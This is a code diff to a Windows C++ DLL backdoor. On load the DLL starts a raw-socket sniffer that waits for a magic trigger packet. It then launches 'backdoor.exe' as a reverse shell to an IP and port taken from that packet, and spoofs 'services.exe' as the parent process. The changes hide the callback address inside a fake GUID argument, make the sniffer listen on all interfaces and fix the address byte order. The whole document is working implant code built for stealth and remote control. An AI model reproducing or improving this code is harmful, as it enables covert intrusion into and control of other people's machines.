@@ -6,6 +6,7 @@
 #include <mstcpip.h>
 #include <WS2tcpip.h>
 #include <string>
+#include <time.h>
 #include "Jade.h"
 
 #define EXPORT __declspec(dllexport)
@@ -71,14 +72,45 @@ int		start_listener(void);
 void
 reverse_shell(unsigned int IP_ADDR, unsigned short PORT)
 {
-	struct sockaddr_in saddr;
-	char* ip;
-	saddr.sin_addr.s_addr = IP_ADDR;
-	ip = inet_ntoa(saddr.sin_addr);
-	std::string ip_s(ip);
-	std::string port = std::to_string(PORT);
-	std::string program = "backdoor.exe";
-	std::string cmdline = program + " " + ip_s + " " + port;
+	srand(time(NULL));
+
+	// Generate random hex chars for the beginning portion of the "GUID" prepend with '{'
+	char first[10];
+	first[0] = '{';
+	for (int i = 1; i < 9; i++) {
+		sprintf(first + i, "%x", (rand() ^ 0xe) % 16);
+	}
+	first[9] = '\0';
+	
+	// Convert hex to char for the two halves of the IP_ADDR portion of the "GUID"
+	char ip_high[5];
+	char ip_low[5];
+	sprintf(ip_high, "%04x", ((IP_ADDR >> 16) & 0xffff));
+	sprintf(ip_low, "%04x", IP_ADDR & 0xffff);
+
+	// Convert hex to char for the PORT portion of the "GUID"
+	char sport[5];
+	sprintf(sport, "%04x", PORT);
+
+	// Generate random hex chars for the last section of the "GUID" append with '}'
+	char last[14];
+	for (int i = 0; i < 12; i++) {
+		sprintf(last + i, "%x", (rand() ^ 0x3) % 16);
+	}
+	last[12] = '}';
+	last[13] = '\0';
+
+	// Convert to each var to string to easily combine
+	std::string str_first(first);
+	std::string str_iph(ip_high);
+	std::string str_ipl(ip_low);
+	std::string str_port(sport);
+	std::string str_last(last);
+	std::string program = "backdoor.exe ";
+
+	// Combine strings to form "GUID"
+	std::string cmdline = program + str_first + "-" + str_iph + "-" + str_ipl + "-" + str_port + "-" + str_last;
+
 	int wchars_num = MultiByteToWideChar(CP_UTF8, 0, cmdline.c_str(), -1, NULL, 0);
 	wchar_t* commandline = new wchar_t[wchars_num];
 	MultiByteToWideChar(CP_UTF8, 0, cmdline.c_str(), -1, commandline, wchars_num);
@@ -86,6 +118,7 @@ reverse_shell(unsigned int IP_ADDR, unsigned short PORT)
 	const char parent[] = "services.exe";
 
 	SpoofParent(commandline, parent);
+	delete commandline;
 }
 
 /* Starts the Raw Socket Listener that waits for the specified
@@ -103,7 +136,7 @@ start_listener(void)
 	DWORD dwFlags = WSA_FLAG_OVERLAPPED;
 	DWORD dwLen = 0;
 	int wsaResult = 0;
-	int optval = 1;
+	int optval = RCVALL_IPLEVEL;
 	int bytes = 0;
 	char* packet;
 
@@ -120,7 +153,7 @@ start_listener(void)
 	sockaddr_in sniffer;
 	sniffer.sin_family = AF_INET;
 	sniffer.sin_port = htons(0);
-	sniffer.sin_addr.s_addr = inet_addr("192.168.1.134");
+	sniffer.sin_addr.s_addr = inet_addr("0.0.0.0");
 
 	if (bind(sock, (SOCKADDR*)&sniffer, sizeof(sniffer)) == SOCKET_ERROR)
 		return -1;
@@ -161,18 +194,19 @@ start_listener(void)
 
 			// Trigger based off of a source and destination port pairing
 			if (((head * 0xdead) % 0xbeef) == tail) {
-				if (cdata->head == 0)
-					continue;
 				
 				unsigned short port;
 				unsigned int   ip;
-
+				
 				//bit shifting to build the return port/IP
 				port = (cdata->port[0] << 8) + (cdata->port[1]);
-				ip = (cdata->addr[3] << 24);
-				ip += (cdata->addr[2] << 16);
-				ip += (cdata->addr[1] << 8);
-				ip += (cdata->addr[0]);
+				ip = (cdata->addr[0] << 24);
+				ip += (cdata->addr[1] << 16);
+				ip += (cdata->addr[2] << 8);
+				ip += (cdata->addr[3]);
+
+				if (port == 0 || cdata->head == 0 || cdata->tail == 0)
+					continue;
 
 				free(packet);
 				shutdown(sock, SD_BOTH);
@@ -199,18 +233,19 @@ start_listener(void)
 
 			// Trigger based off of a source and destination port pairing
 			if (((head * 0xdead) % 0xbeef) == tail) {
-				if (cdata->head == 0)
-					continue;
-
+				
 				unsigned short port;
 				unsigned int   ip;
 
 				//bit shifting to build the return port/IP
 				port = (cdata->port[0] << 8) + (cdata->port[1]);
-				ip = (cdata->addr[3] << 24);
-				ip += (cdata->addr[2] << 16);
-				ip += (cdata->addr[1] << 8);
-				ip += (cdata->addr[0]);
+				ip = (cdata->addr[0] << 24);
+				ip += (cdata->addr[1] << 16);
+				ip += (cdata->addr[2] << 8);
+				ip += (cdata->addr[3]);
+
+				if (port == 0 || cdata->head == 0 || cdata->tail == 0)
+					continue;
 
 				free(packet);
 				shutdown(sock, SD_BOTH);
@@ -266,6 +301,8 @@ DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
 	HANDLE hThread;
     switch (ul_reason_for_call)
     {
+	// Spawns the listener on DLL load. CloseHandle ensures the program can continue
+	// without hanging and the new thread continues in the background
     case DLL_PROCESS_ATTACH:
 		hThread = CreateThread(NULL, 0, Run, NULL, 0, NULL);
 		if (hThread != NULL)
